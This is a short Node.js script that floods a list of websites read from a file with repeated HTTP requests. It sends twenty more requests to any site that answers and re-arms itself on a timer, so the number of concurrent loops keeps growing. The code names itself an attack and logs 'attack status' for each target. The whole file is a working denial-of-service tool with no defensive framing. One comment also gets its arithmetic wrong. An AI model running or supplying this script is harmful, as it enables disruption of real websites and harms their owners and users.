const SITES_FILE = 'urls.txt'; // file with sites list
const ATTACK_COUNT = 20; // number of attacks per site
const DELAY_BETWEEN_ATTACK = 120000; // ms 6000 = 1min

const request = require('request');
const fs = require('fs');
const readline = require('readline');

const urls = [];
const statistics = {
  success: 0,
  denied: 0,
};

function repeatFunction(url, func, times) {
  if (times <= 0) return;
  func(url);
  repeatFunction(url, func, --times);
}

async function updateUrls() {
  const fileStream = fs.createReadStream(SITES_FILE);
  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity,
  });

  for await (const line of rl) urls.push(line);
}

function attackSite(url, testAttack = false) {
  request(url, bodyRequest.bind({ url, testAttack }));
}

function bodyRequest(err, res, body) {
  const attackStatus = body?.length ? 'Success' : 'Denied';
  const { url, testAttack } = this;
  try {
    if (err) throw err;
    console.log(
      `Site ${url} has been attacked, attack status: ${attackStatus}, code: ${res.statusCode}`
    );
  } catch (e) {
    console.log(
      `Site ${url} has been attacked, attack status: ${attackStatus}, error code: ${e.errno}`
    );
  }
  if (attackStatus === 'Success' && testAttack) {
    repeatFunction(url, attackSite, ATTACK_COUNT);
  }
  attackStatus === 'Success' ? statistics.success++ : statistics.denied++;
}

async function startAttack() {
  console.log(
    `ATTACK STATISTICS: SUCCESS = ${statistics.success}, DENIED = ${statistics.denied}`
  );
  await updateUrls();
  if (urls.length) for await (const url of urls) attackSite(url, true);
  setInterval(startAttack, DELAY_BETWEEN_ATTACK);
}

startAttack(); // main function

console.log('Attack had been started....');
